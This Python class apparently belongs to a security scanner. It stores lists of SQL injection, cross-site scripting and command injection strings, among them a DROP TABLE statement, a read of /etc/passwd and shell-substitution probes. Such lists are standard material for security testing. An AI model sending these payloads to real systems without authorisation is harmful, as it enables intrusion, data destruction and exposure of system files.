class PayloadManager:
    SQL_INJECTIONS = [
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version,NULL,NULL--",
        "'; DROP TABLE users--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
    ]

    COMMAND_INJECTIONS = [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(id)",
    ]

    @staticmethod
    def get_all_payloads():
        return {
            "SQL Injection": PayloadManager.SQL_INJECTIONS,
            "XSS": PayloadManager.XSS_PAYLOADS,
            "Command Injection": PayloadManager.COMMAND_INJECTIONS
        } 